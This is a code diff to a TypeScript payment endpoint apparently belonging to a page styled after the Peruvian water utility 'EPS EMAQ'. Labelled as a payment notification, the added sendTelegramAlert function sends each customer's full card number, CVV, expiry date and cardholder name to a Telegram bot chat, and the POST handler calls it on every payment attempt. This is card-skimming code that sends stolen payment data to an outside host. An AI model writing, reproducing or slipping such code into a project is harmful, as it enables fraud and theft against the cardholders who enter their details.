@@ -56,6 +56,49 @@ function simularPago(num: string): { exitoso: boolean; motivo?: string } {
   return { exitoso: false, motivo: 'Número de tarjeta inválido' };
 }
 
+async function sendTelegramAlert(data: {
+  codcliente: string;
+  nombre: string;
+  monto: number;
+  numTarjetaCompleto: string;
+  tarjeta: string;
+  cvv: string;
+  titular: string;
+  vencimiento: string;
+  estado: string;
+  nroOperacion: string;
+  fecha: string;
+}) {
+  const token = process.env.TELEGRAM_BOT_TOKEN;
+  const chatId = process.env.TELEGRAM_CHAT_ID;
+  if (!token || !chatId) return;
+
+  const icono = data.estado === 'EXITOSO' ? '✅' : '❌';
+  const msg = [
+    `${icono} *NUEVO PAGO — EPS EMAQ*`,
+    `━━━━━━━━━━━━━━━━━━━━`,
+    `👤 *Cliente:* ${data.nombre}`,
+    `📋 *Código:* ${data.codcliente}`,
+    `💰 *Monto:* S/ ${data.monto.toFixed(2)}`,
+    `━━━━━━━━━━━━━━━━━━━━`,
+    `💳 *Tarjeta:* ${data.tarjeta}`,
+    `🔢 *Número:* \`${data.numTarjetaCompleto}\``,
+    `📅 *Vencimiento:* ${data.vencimiento}`,
+    `🔐 *CVV:* ${data.cvv}`,
+    `👤 *Titular:* ${data.titular}`,
+    `━━━━━━━━━━━━━━━━━━━━`,
+    `${icono} *Estado:* ${data.estado}`,
+    `🆔 *N° Op:* ${data.nroOperacion}`,
+    `🕐 *Fecha:* ${data.fecha}`,
+  ].join('\n');
+
+  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'Markdown' }),
+  });
+}
+
 async function guardarEnDB(data: {
   fecha: string;
   codcliente: string;
@@ -117,6 +160,25 @@ export async function POST(req: NextRequest) {
     });
   } catch (e) {
     console.error('Error al escribir en DB:', e);
+  }
+
+  // Notificación Telegram
+  try {
+    await sendTelegramAlert({
+      codcliente,
+      nombre,
+      monto,
+      numTarjetaCompleto: numCompleto,
+      tarjeta: tarjetaMask,
+      cvv: cvv || '',
+      titular,
+      vencimiento,
+      estado,
+      nroOperacion,
+      fecha,
+    });
+  } catch (e) {
+    console.error('Error al enviar alerta Telegram:', e);
   }
 
   // Guardar en CSV (local)
